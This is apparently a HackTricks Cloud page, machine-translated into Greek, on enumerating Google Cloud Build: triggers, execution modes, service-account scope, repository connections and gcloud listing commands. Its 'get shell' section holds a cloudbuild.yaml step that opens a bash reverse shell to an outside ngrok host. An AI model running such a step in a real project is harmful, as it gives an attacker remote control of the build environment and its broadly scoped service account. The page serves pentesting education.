# GCP - Απαρίθμηση Cloud Build

<details>

<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι υποστήριξης του HackTricks:

* Αν θέλετε να δείτε την **εταιρεία σας διαφημισμένη στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε** στην 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα τηλεγραφήματος**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs** στα [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>

## Βασικές Πληροφορίες

Το Google Cloud Build είναι μια διαχειριζόμενη πλατφόρμα CI/CD που **αυτοματοποιεί τη διαδικασία κατασκευής λογισμικού** και απελευθερώνει διαδικασίες, ενσωματώνοντας **αποθετήρια κώδικα πηγής** και υποστηρίζοντας μια ευρεία γκάμα γλωσσών προγραμματισμού. Επιτρέπει στους προγραμματιστές να κατασκευάζουν, να δοκιμάζουν και να αποθέτουν κώδικα αυτόματα, παρέχοντας ταυτόχρονα ευελιξία για προσαρμογή βημάτων κατασκευής και ροών εργασίας.

Κάθε ένα Cloud Build Trigger **σχετίζεται με ένα Cloud Repository ή συνδέεται απευθείας με ένα εξωτερικό αποθετήριο** (Github, Bitbucket και Gitlab).

{% hint style="success" %}
Δεν είδα κάποιον τρόπο να κλέψω το token του Github/Bitbucket από εδώ ή από τα Cloud Repositories επειδή όταν το αποθετήριο κατεβάζεται, προσπελαύνεται μέσω ενός URL [https://source.cloud.google.com/](https://source.cloud.google.com/) και το Github δεν προσπελαύνεται από τον πελάτη.
{% endhint %}

### Γεγονότα

Το Cloud Build μπορεί να ενεργοποιηθεί αν:

* **Πιέσετε σε μια κλαδί**: Καθορίστε το κλαδί
* **Πιέσετε ένα νέο ετικέτα**: Καθορίστε την ετικέτα
* **Αίτημα ενσωμάτωσης**: Καθορίστε το κλαδί που λαμβάνει το αίτημα ενσωμάτωσης
* **Χειροκίνητη Κλήση**
* **Μήνυμα Pub/Sub:** Καθορίστε το θέμα
* **Συμβάν Webhook**: Θα εκθέσει ένα URL HTTPS και το αίτημα πρέπει να είναι πιστοποιημένο με ένα μυστικό

### Εκτέλεση

Υπάρχουν 3 επιλογές:

* Ένα yaml/json **που καθορίζει τις εντολές** προς εκτέλεση. Συνήθως: `/cloudbuild.yaml`
* Μόνο μία που μπορεί να καθοριστεί "inline" στον ιστότοπο κονσόλας και στο cli
* Πιο κοινή επιλογή
* Σχετική με την μη πιστοποιημένη πρόσβαση
* Ένα **Dockerfile** για κατασκευή
* Ένα **Buildpack** για κατασκευή

### Δικαιώματα SA

Ο **Λογαριασμός Υπηρεσίας έχει το πεδίο `cloud-platform`**, έτσι μπορεί **να χρησιμοποιήσει όλα τα προνόμια.** Αν **δεν καθοριστεί κάποιος Λογαριασμός Υπηρεσίας** (όπως όταν γίνεται υποβολή), θα χρησιμοποιηθεί ο **προεπιλεγμένος Λογαριασμός Υπηρεσίας** `<αριθμός-έργου>@cloudbuild.gserviceaccount.com`.

Προεπιλείς δεν δίνονται δικαιώματα, αλλά είναι αρκετά εύκολο να του δοθούν κάποια:

<figure><img src="../../../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Έγκριση

Είναι δυνατόν να διαμορφώσετε ένα Cloud Build για **απαιτεί έγκριση για τις εκτελέσεις κατασκευής** (απενεργοποιημένο από προεπιλογή).

### Συνδέσεις & Αποθετήρια

Οι συνδέσεις μπορούν να δημιουργηθούν μέσω:

* **GitHub:** Θα εμφανίσει ένα παράθυρο εξουσιοδότησης OAuth που ζητά άδειες για **να λάβει ένα τοκέν του Github** που θα αποθηκευτεί μέσα στο **Διαχειριστή Μυστικών.**
* **GitHub Enterprise:** Θα ζητήσει να εγκαταστήσετε ένα **GithubApp**. Ένα **διακριτικό ταυτοποίησης** από τον κεντρικό σας διακομιστή GitHub θα δημιουργηθεί και θα αποθηκευτεί σε αυτό το έργο ως μυστικό του **Διαχειριστή Μυστικών.**
* **GitLab / Enterprise:** Πρέπει να **παρέχετε το διακριτικό πρόσβασης API και το διακριτικό πρόσβασης Read API** που θα αποθηκευτεί στο **Διαχειριστή Μυστικών.**

Μόλις δημιουργηθεί μια σύνδεση, μπορείτε να τη χρησιμοποιήσετε για **να συνδέσετε αποθετήρια στα οποία ο λογαριασμός Github έχει πρόσβαση**.

Αυτή η επιλογή είναι διαθέσιμη μέσω του κουμπιού:

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

{% hint style="success" %}
Σημειώστε ότι τα αποθετήρια που συνδέονται με αυτόν τον τρόπο είναι **διαθέσιμα μόνο στα Σημεία Ενεργοποίησης που χρησιμοποιούν τη 2η γενιά.**
{% endhint %}

### Σύνδεση Αποθετηρίου

Αυτό δεν είναι το ίδιο με μια **`σύνδεση`**. Αυτό επιτρέπει **διαφορετικούς** τρόπους να **έχετε πρόσβαση σε ένα αποθετήριο Github ή Bitbucket** αλλά **δεν δημιουργεί ένα αντικείμενο σύνδεσης, αλλά δημιουργεί ένα αντικείμενο αποθετηρίου (της 1ης γενιάς).**

Αυτή η επιλογή είναι διαθέσιμη μέσω του κουμπιού:

<figure><img src="../../../.gitbook/assets/image (2) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

### Αποθήκευση

Μερικές φορές το Cloud Build θα **δημιουργήσει μια νέα αποθήκευση για την αποθήκευση των αρχείων για το σημείο ενεργοποίησης**. Αυτό συμβαίνει για παράδειγμα στο παράδειγμα που προσφέρει το GCP με:
```bash
git clone https://github.com/GoogleCloudBuild/cloud-console-sample-build && \
cd cloud-console-sample-build && \
gcloud builds submit --config cloudbuild.yaml --region=global
```
Δημιουργήθηκε ένα κουτί αποθήκευσης με το όνομα [security-devbox\_cloudbuild](https://console.cloud.google.com/storage/browser/security-devbox\_cloudbuild;tab=objects?forceOnBucketsSortingFiltering=false\&project=security-devbox) για να αποθηκεύει ένα αρχείο `.tgz` με τα αρχεία που θα χρησιμοποιηθούν.

### Λήψη κέλυφους
```yaml
steps:
- name: bash
script: |
#!/usr/bin/env bash
bash -i >& /dev/tcp/5.tcp.eu.ngrok.io/12395 0>&1
options:
logging: CLOUD_LOGGING_ONLY
```
### Απαρίθμηση

Μπορείτε να βρείτε **ευαίσθητες πληροφορίες σε ρυθμίσεις και καταγραφές κατασκευής**.
```bash
# Get configured triggers configurations
gcloud builds triggers list # Check for the words github and bitbucket
gcloud builds triggers describe <trigger-name>

# Get build executions
gcloud builds list
gcloud builds describe <build-uuid> # Get even the build yaml if defined in there
gcloud builds log <build-uuid> # Get build logs

# List all connections of each region
regions=("${(@f)$(gcloud compute regions list --format='value(name)')}")
for region in $regions; do
echo "Listing build connections in region: $region"
connections=("${(@f)$(gcloud builds connections list --region="$region" --format='value(name)')}")
if [[ ${#connections[@]} -eq 0 ]]; then
echo "No connections found in region $region."
else
for connection in $connections; do
echo "Describing connection $connection in region $region"
gcloud builds connections describe "$connection" --region="$region"
echo "-----------------------------------------"
done
fi
echo "========================================="
done

# List all worker-pools
regions=("${(@f)$(gcloud compute regions list --format='value(name)')}")
for region in $regions; do
echo "Listing build worker-pools in region: $region"
gcloud builds worker-pools list --region="$region"
echo "-----------------------------------------"
done
```
### Εscalation προνομίων

{% content-ref url="../../gcp-security/gcp-privilege-escalation/gcp-cloudbuild-privesc.md" %}
[gcp-cloudbuild-privesc.md](../../gcp-security/gcp-privilege-escalation/gcp-cloudbuild-privesc.md)
{% endcontent-ref %}

### Μη εξουσιοδοτημένη πρόσβαση

{% content-ref url="../../gcp-security/gcp-unaunthenticated-enum-and-access/gcp-cloud-build-unauthenticated-enum.md" %}
[gcp-cloud-build-unauthenticated-enum.md](../../gcp-security/gcp-unaunthenticated-enum-and-access/gcp-cloud-build-unauthenticated-enum.md)
{% endcontent-ref %}

### Μετά την εκμετάλλευση

{% content-ref url="../../gcp-security/gcp-post-exploitation/gcp-cloud-build-post-exploitation.md" %}
[gcp-cloud-build-post-exploitation.md](../../gcp-security/gcp-post-exploitation/gcp-cloud-build-post-exploitation.md)
{% endcontent-ref %}

<details>

<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι υποστήριξης του HackTricks:

* Αν θέλετε να δείτε την **εταιρεία σας διαφημισμένη στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε στη** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στη [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια στο GitHub.

</details>
